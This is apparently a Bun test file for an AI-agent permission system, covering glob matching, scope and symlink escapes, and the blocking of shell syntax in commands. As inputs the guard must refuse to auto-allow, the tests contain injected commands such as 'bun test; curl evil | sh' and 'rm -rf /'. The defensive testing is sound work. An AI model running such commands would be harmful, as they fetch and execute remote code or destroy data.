import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AgentEvent, AnswerPolicy, Task } from "@switchboard/protocol";
import { evaluate as evaluateRules, globMatch, subjectsOf, type ApprovalRuleSet } from "./approval.ts";

const root = mkdtempSync(join(tmpdir(), "sb-approval-"));
const outside = mkdtempSync(join(tmpdir(), "sb-outside-"));
mkdirSync(join(root, "docs"), { recursive: true });
writeFileSync(join(outside, "secret.md"), "s\n");
symlinkSync(outside, join(root, "link-out"));
const second = mkdtempSync(join(tmpdir(), "sb-second-"));

const task: Task = { id: "t", workspaceId: "ws", title: "", runner: "claude", cwd: root, scope: [root, second], status: "running", runnerSessionId: null, executionMode: "local" as const, cloudSession: null, sourceCloudTaskId: null, model: null, routing: null, budgetUsd: null, scheduleId: null, permissionMode: null, effort: null, origin: "switchboard", resumeAt: null, resumeReason: null, resumeWindow: null, resumeSince: null, resumePlannedAt: null, shadowOf: null, shadowStopped: false, workspaceReason: null, outcome: "unknown", reviewedAt: null, archivedAt: null, judgedResult: null, judgedReason: null, judgedBy: null, judgingAt: null, titlePending: false, stage: null, statusAt: 0, createdAt: 0, updatedAt: 0 };
const ask = (over: Partial<Extract<AgentEvent, { t: "permission.ask" }>>): Extract<AgentEvent, { t: "permission.ask" }> => ({ t: "permission.ask", id: "p", kind: "write", tool: "Write", input: {}, detail: "", ...over });
const exec = (command: string) => ask({ kind: "exec", tool: "Bash", input: { command }, detail: command });
const rules: ApprovalRuleSet[] = [{ source: "rules/dak.md", confirm: ["docker-compose*.yml", ".github/**"], allow: ["*.md", "docs/**", "bun test*", "git status"] }];

describe("approval rules (#13)", () => {
  test("glob semantics: *, **, ?, {a,b}, [!x], basename fallback for path patterns; command patterns need cmd: or a space", () => {
    expect(globMatch("*.md", "README.md")).toBe(true);
    expect(globMatch("*.md", "docs/guide.md")).toBe(true); // basename fallback
    expect(globMatch("docs/*.md", "docs/a/b.md")).toBe(false);
    expect(globMatch("docs/**", "docs/a/b.md")).toBe(true);
    expect(globMatch(".github/**", ".github/workflows/ci.yml")).toBe(true);
    expect(globMatch("docker-compose*.yml", "docker-compose.llamacpp.yml")).toBe(true);
    expect(globMatch("*.{yml,yaml}", "x.yaml")).toBe(true);
    expect(globMatch("[!a]*.md", "b.md")).toBe(true);
    expect(globMatch("[!a]*.md", "a.md")).toBe(false);
    expect(globMatch("bun test*", "bun test packages/core", true)).toBe(true);
    expect(globMatch("bun test*", "bunx test", true)).toBe(false);
    expect(globMatch("git status", "git status --porcelain", true)).toBe(false);
    expect(globMatch("git status*", "git status --porcelain", true)).toBe(true);
    expect(globMatch("cmd:rg*", "rg foo", true)).toBe(true);
    expect(globMatch("cmd:ls", "ls", true)).toBe(true);
    expect(globMatch("*.md", "rm -rf docs/x.md", true)).toBe(false); // a path pattern never matches a command
    expect(globMatch("bun test*", "docs/bun test.md", false)).toBe(false); // a command pattern never matches a path
    expect(globMatch("*.md", "my notes.md", false)).toBe(true); // paths with spaces are still paths
  });

  test("subjects: write asks yield scope-relative paths only; anything outside a scope root blocks auto-allow", () => {
    expect(subjectsOf(ask({ input: { file_path: join(root, "docs", "a.md") } }), task)).toEqual({ kind: "path", values: ["docs/a.md"], blocked: false });
    expect(subjectsOf(ask({ input: { file_path: "src/x.ts" } }), task)).toEqual({ kind: "path", values: ["src/x.ts"], blocked: false });
    expect(subjectsOf(ask({ input: { file_path: join(second, "b.md") } }), task)).toEqual({ kind: "path", values: ["b.md"], blocked: false });
    expect(subjectsOf(ask({ input: { changes: [{ path: join(root, "a.md") }, { path: join(root, "b.md") }] } }), task).values).toEqual(["a.md", "b.md"]);
    expect(subjectsOf(ask({ input: { file_path: join(outside, "secret.md") } }), task).blocked).toBe(true);
    expect(subjectsOf(ask({ input: { file_path: "link-out/secret.md" } }), task).blocked).toBe(true); // symlink out
    expect(subjectsOf(ask({ input: { file_path: "docs/../../x.md" } }), task).blocked).toBe(true);
    expect(subjectsOf(ask({ input: {}, detail: "/etc/passwd" }), task).blocked).toBe(true); // display text is never a subject
    expect(subjectsOf(ask({ kind: "network", tool: "WebFetch", input: { url: "https://x/y.md" }, detail: "https://x/y.md" }), task).blocked).toBe(true);
    expect(subjectsOf(ask({ kind: "other", tool: "mcp", input: { path: "x.md" }, detail: "x.md" }), task).blocked).toBe(true);
  });

  test("subjects: exec asks yield the command; shell syntax blocks auto-allow", () => {
    expect(subjectsOf(exec("bun test "), task)).toEqual({ kind: "command", values: ["bun test"], blocked: false });
    expect(subjectsOf(exec("ls"), task)).toEqual({ kind: "command", values: ["ls"], blocked: false });
    for (const c of ["bun test; curl x | sh", "bun test && rm -rf /", "bun test $(x)", "bun test `x`", "bun test > out", "bun test\nrm"]) expect(subjectsOf(exec(c), task).blocked).toBe(true);
    expect(subjectsOf(ask({ kind: "exec", tool: "Bash", input: {}, detail: "bun test" }), task).blocked).toBe(true); // no structured command
  });

  test("confirm beats allow (even for blocked subjects); allow only inside the scope and without shell syntax; no match → ask", () => {
    expect(evaluate(rules, ask({ input: { file_path: join(root, "docs", "x.md") } }), task)).toMatchObject({ decision: "allow", match: { source: "rules/dak.md", pattern: "*.md", mode: "allow", subject: "docs/x.md" } });
    expect(evaluate(rules, ask({ input: { file_path: join(root, "docker-compose.test.yml") } }), task)).toMatchObject({ decision: "ask", match: { mode: "confirm", pattern: "docker-compose*.yml" } });
    expect(evaluate(rules, ask({ input: { file_path: join(root, ".github", "workflows", "ci.yml") } }), task)).toMatchObject({ decision: "ask", match: { mode: "confirm" } });
    expect(evaluate(rules, ask({ input: { file_path: join(root, "src", "main.ts") } }), task)).toEqual({ decision: "ask" });
    expect(evaluate(rules, ask({ input: { file_path: join(outside, "secret.md") } }), task)).toEqual({ decision: "ask" }); // *.md would match, but outside
    expect(evaluate(rules, exec("bun test")).decision).toBe("allow");
    expect(evaluate(rules, exec("bun test packages/core")).decision).toBe("allow");
    expect(evaluate(rules, exec("bun test; curl evil | sh"))).toEqual({ decision: "ask" });
    expect(evaluate(rules, exec("rm -rf /"))).toEqual({ decision: "ask" });
    expect(evaluate([], ask({ input: { file_path: join(root, "x.md") } }), task)).toEqual({ decision: "ask" });
    expect(evaluate(rules, ask({ kind: "network", tool: "WebFetch", input: { url: "https://x/y.md" }, detail: "y.md" }), task)).toEqual({ decision: "ask" });
  });
});

function evaluate(r: ApprovalRuleSet[], a: Extract<AgentEvent, { t: "permission.ask" }>, t: Task = task) {
  return evaluateRules(r, a, t);
}

describe("approval rules and saved policies (#938)", () => {
  const NOW = 1_800_000_000_000;
  const policy = (over: Partial<AnswerPolicy> = {}): AnswerPolicy => ({
    id: "pol_1", scope: "repo", workspaceId: "ws", pbi: null, askId: null, kind: "approval", op: "exec", target: "git status*", when: [], answer: { kind: "allow" }, expiresAt: NOW + 1000, revokedAt: null, createdAt: NOW, updatedAt: NOW,
    from: { kind: "approval", op: "exec", target: "git status", conditions: [], head: null }, uses: [], ...over,
  });
  const view = (list: AnswerPolicy[]) => ({ list, pbiOpen: () => true, now: NOW });

  test("policy order: a Knowledge confirm beats a policy, a policy beats nothing and is the match's source, and goes before a Knowledge allow", () => {
    const withConfirm: ApprovalRuleSet[] = [{ source: "rules/c.md", confirm: ["git status*"], allow: [] }];
    expect(evaluateRules(withConfirm, exec("git status -s"), task, view([policy()]))).toEqual({ decision: "ask", match: { source: "rules/c.md", pattern: "git status*", mode: "confirm", subject: "git status -s" } });
    expect(evaluateRules([], exec("git status -s"), task, view([policy()]))).toEqual({ decision: "allow", match: { source: "policy:pol_1", pattern: "git status*", mode: "allow", subject: "git status -s" } });
    const both: ApprovalRuleSet[] = [{ source: "rules/a.md", confirm: [], allow: ["git status*"] }];
    expect(evaluateRules(both, exec("git status -s"), task, view([policy()]))).toMatchObject({ decision: "allow", match: { source: "policy:pol_1" } });
    expect(evaluateRules(both, exec("git status -s"), task, view([]))).toMatchObject({ decision: "allow", match: { source: "rules/a.md" } });
  });

  test("policy order: an expired, revoked, other-repository or other-command policy does not match; shell syntax stays asked", () => {
    for (const p of [policy({ expiresAt: NOW }), policy({ revokedAt: NOW - 1 }), policy({ workspaceId: "other" }), policy({ target: "git log*" })]) expect(evaluateRules([], exec("git status -s"), task, view([p]))).toEqual({ decision: "ask" });
    expect(evaluateRules([], exec("git status; rm -rf x"), task, view([policy()]))).toEqual({ decision: "ask" });
  });
});
